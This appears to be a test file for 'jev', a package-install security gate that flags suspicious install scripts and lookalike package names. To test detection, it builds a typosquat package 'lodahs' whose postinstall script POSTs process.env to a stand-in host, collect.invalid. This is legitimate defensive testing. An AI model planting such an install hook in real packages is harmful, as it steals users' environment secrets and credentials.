// jev against a mock TypeSafe API (TYPESAFE_API_URL) and a mock registry serving a packument
// and a real gzipped tarball, plus `jev gate` over an installed file: dependency.
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { cpSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { join } from "node:path";
import { editDistance, imitationCandidates, referencedFile } from "../src/lib/security/jev.ts";
import { afterAll, beforeAll, describe, expect, test } from "./support/harness.ts";
import { REPO, type Sandbox, sandbox, vltx } from "./support/sandbox.ts";

const LONG = 180_000;
const KEY = "ts-test-key";

type Seen = { auth: string | undefined; body: { state: any; model: string; questions: Record<string, any> } };
const mock = { noul: 0.93, score: 2.4, fail429: 0, seen: [] as Seen[] };

let sb: Sandbox;
let env: Record<string, string>;
let server: Server;
let base = "";
let tgz: Buffer;

const answersFor = (questions: Record<string, any>): Record<string, unknown> => {
  const out: Record<string, unknown> = {};
  for (const [id, q] of Object.entries(questions)) {
    if (q.type === "noul") out[id] = { type: "noul", noul: mock.noul };
    else if (q.type === "score") {
      const legend = Object.fromEntries((q.criteria as string[]).map((c, i) => [String(i), c]));
      out[id] = { type: "score", score: mock.score, legend, probabilities: { "0": 0.0, "1": 0.1, "2": 0.4, "3": 0.5 }, confidence: 0.55 };
    } else if (q.type === "choice") {
      const keys = Object.keys(q.criteria);
      const top = keys.find((k) => k !== "none") ?? "none";
      out[id] = { type: "choice", choice: top, probabilities: Object.fromEntries(keys.map((k) => [k, k === top ? 0.8 : 0.2 / (keys.length - 1)])), confidence: 0.7 };
    }
  }
  return out;
};

beforeAll(async () => {
  sb = sandbox();
  // a tarball for "lodahs@1.0.0" whose postinstall runs setup.js
  const pkgDir = join(sb.dir, "tar", "package");
  mkdirSync(pkgDir, { recursive: true });
  writeFileSync(join(pkgDir, "package.json"), JSON.stringify({ name: "lodahs", version: "1.0.0", scripts: { postinstall: "node setup.js" } }));
  writeFileSync(join(pkgDir, "setup.js"), 'fetch("https://collect.invalid/", { method: "POST", body: JSON.stringify(process.env) });\n');
  const t = spawnSync("tar", ["-czf", join(sb.dir, "lodahs-1.0.0.tgz"), "-C", join(sb.dir, "tar"), "package"]);
  if (t.status !== 0) throw new Error(`tar failed: ${t.stderr}`);
  tgz = readFileSync(join(sb.dir, "lodahs-1.0.0.tgz"));
  const integrity = `sha512-${createHash("sha512").update(tgz).digest("base64")}`;

  server = createServer((req, res) => {
    let data = "";
    req.on("data", (c: Buffer) => void (data += c.toString()));
    req.on("end", () => {
      const url = req.url ?? "/";
      if (req.method === "POST" && url === "/v1/systemone") {
        const body = JSON.parse(data);
        mock.seen.push({ auth: req.headers.authorization, body });
        if (mock.fail429 > 0) {
          mock.fail429--;
          res.writeHead(429, { "content-type": "application/json" }).end(JSON.stringify({ detail: { message: "slow down" } }));
          return;
        }
        if (req.headers.authorization !== `Bearer ${KEY}`) {
          res.writeHead(403, { "content-type": "application/json" }).end(JSON.stringify({ detail: { error_type: "authentication_error", message: "Must supply an API key!" } }));
          return;
        }
        res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ model: "jev-mock-1", answers: answersFor(body.questions), usage: { input_tokens: 1, output_tokens: 1 } }));
        return;
      }
      if (url === "/lodahs") {
        res.writeHead(200, { "content-type": "application/json" }).end(
          JSON.stringify({
            name: "lodahs",
            "dist-tags": { latest: "1.0.0" },
            versions: { "1.0.0": { name: "lodahs", version: "1.0.0", description: "utility belt", scripts: { postinstall: "node setup.js", test: "echo" }, dist: { tarball: `${base}/lodahs/-/lodahs-1.0.0.tgz`, integrity } } },
          }),
        );
        return;
      }
      if (url === "/lodahs/-/lodahs-1.0.0.tgz") {
        res.writeHead(200, { "content-type": "application/octet-stream" }).end(tgz);
        return;
      }
      res.writeHead(404).end("{}");
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  env = { ...sb.env, TYPESAFE_API_KEY: KEY, TYPESAFE_API_URL: base };
});
afterAll(async () => {
  await new Promise<void>((r) => server?.close(() => r()));
  sb?.cleanup();
});

describe("jev helpers", () => {
  test("edit distance, lookalike candidates and the referenced script file", () => {
    expect(editDistance("lodahs", "lodash")).toBe(1);
    expect(imitationCandidates("lodahs")).toContain("lodash");
    expect(imitationCandidates("@evil/lodash")).toContain("lodash");
    expect(imitationCandidates("lodash")).not.toContain("lodash");
    expect(referencedFile({ postinstall: "node ./scripts/install.js --quiet" })).toBe("scripts/install.js");
    expect(referencedFile({ install: "node-gyp rebuild" })).toBeUndefined();
    expect(referencedFile({ postinstall: "node ../../etc/x.js" })).toBeUndefined();
  });
});

describe("jev explain", () => {
  test(
    "needs TYPESAFE_API_KEY (exit 2)",
    async () => {
      const { TYPESAFE_API_KEY: _k, ...noKey } = env;
      const r = await vltx(["jev", "explain", "lodahs@1.0.0", "--registry", `${base}/`], { cwd: sb.dir, env: noKey });
      expect(r.code).toBe(2);
      expect(r.stderr).toContain("TYPESAFE_API_KEY");
    },
    LONG,
  );

  test(
    "sends the scripts and the script file from the verified tarball, asks noul/score/choice, retries a 429, prints probabilities",
    async () => {
      mock.seen = [];
      mock.fail429 = 1;
      mock.noul = 0.93;
      const r = await vltx(["jev", "explain", "lodahs@1.0.0", "--registry", `${base}/`], { cwd: sb.dir, env });
      expect(r.code).toBe(0);
      expect(mock.seen.length).toBe(2);
      const req = mock.seen[1] as Seen;
      expect(req.auth).toBe(`Bearer ${KEY}`);
      expect(req.body.model).toBe("jev-latest");
      expect(req.body.questions.exfil.type).toBe("noul");
      expect(req.body.questions.exfil.instructions).toBe("Does this install script send data off the machine?");
      expect(req.body.questions.reach.type).toBe("score");
      expect(req.body.questions.reach.criteria.length).toBe(4);
      expect(req.body.questions.imitation.type).toBe("choice");
      expect(Object.keys(req.body.questions.imitation.criteria)).toEqual(expect.arrayContaining(["lodash", "none"]));
      expect(req.body.state.install_scripts).toEqual({ postinstall: "node setup.js" });
      expect(req.body.state.script_file.path).toBe("setup.js");
      expect(req.body.state.script_file.content).toContain("process.env");
      expect(r.stdout).toContain("exfil      noul 0.93");
      expect(r.stdout).toMatch(/reach\s+score 2\.40 of 0-3, confidence 0\.55/);
      expect(r.stdout).toMatch(/imitation\s+choice lodash, confidence 0\.70/);
      expect(r.stdout).toMatch(/verdict\s+block\s+block: exfil \(noul\) 0\.93 >= 0\.5/);
    },
    LONG,
  );

  test(
    "--json carries the evidence, the raw answers and the verdict; API errors exit 1 with the API message",
    async () => {
      mock.noul = 0.1;
      const r = await vltx(["jev", "explain", "lodahs", "--registry", `${base}/`, "--json"], { cwd: sb.dir, env });
      expect(r.code).toBe(0);
      const doc = JSON.parse(r.stdout) as { evidence: { version: string }; response: { model: string; answers: Record<string, any> }; verdict: { level: string } };
      expect(doc.evidence.version).toBe("1.0.0");
      expect(doc.response.model).toBe("jev-mock-1");
      expect(doc.response.answers.exfil.noul).toBe(0.1);
      expect(doc.verdict.level).toBe("warn"); // reach 2.4 >= 1.5 warns by default
      const bad = await vltx(["jev", "explain", "lodahs", "--registry", `${base}/`], { cwd: sb.dir, env: { ...env, TYPESAFE_API_KEY: "wrong" } });
      expect(bad.code).toBe(1);
      expect(bad.stderr).toContain("HTTP 403: Must supply an API key!");
    },
    LONG,
  );
});

describe("jev gate", () => {
  test(
    "explains every installed :scripts package from local evidence and blocks on the noul threshold",
    async () => {
      const app = join(sb.dir, "app");
      mkdirSync(join(app, "vendor"), { recursive: true });
      cpSync(join(REPO, "fixtures", "hostile-postinstall", "evil-pkg"), join(app, "vendor", "evil-pkg"), { recursive: true });
      writeFileSync(join(app, "package.json"), JSON.stringify({ name: "app", version: "1.0.0", dependencies: { "evil-pkg": "file:./vendor/evil-pkg" } }));
      writeFileSync(join(app, "vlt.json"), JSON.stringify({ config: { registries: { npm: "https://registry.npmjs.org/" } } }));
      const i = spawnSync("vlt", ["install", "--allow-scripts=:not(*)"], { cwd: app, env, encoding: "utf8" });
      expect(i.status).toBe(0);
      mock.seen = [];
      mock.noul = 0.9;
      mock.score = 1.0;
      const r = await vltx(["jev", "gate"], { cwd: app, env });
      expect(r.code).toBe(3);
      expect(r.stderr).toContain("jev gate blocked: evil-pkg@1.0.0");
      expect(mock.seen.length).toBe(1);
      const st = (mock.seen[0] as Seen).body.state;
      expect(st.install_scripts).toEqual({ postinstall: "node postinstall.js" });
      expect(st.script_file.content).toContain("canary");
      writeFileSync(join(app, "gate.json"), JSON.stringify({ rules: [], jev: { noul: { block: 0.95, warn: 0.5 } } }));
      const w = await vltx(["jev", "gate"], { cwd: app, env });
      expect(w.code).toBe(0);
      expect(w.stdout).toMatch(/verdict\s+warn\s+warn: exfil \(noul\) 0\.90 >= 0\.5/);
    },
    LONG,
  );
});
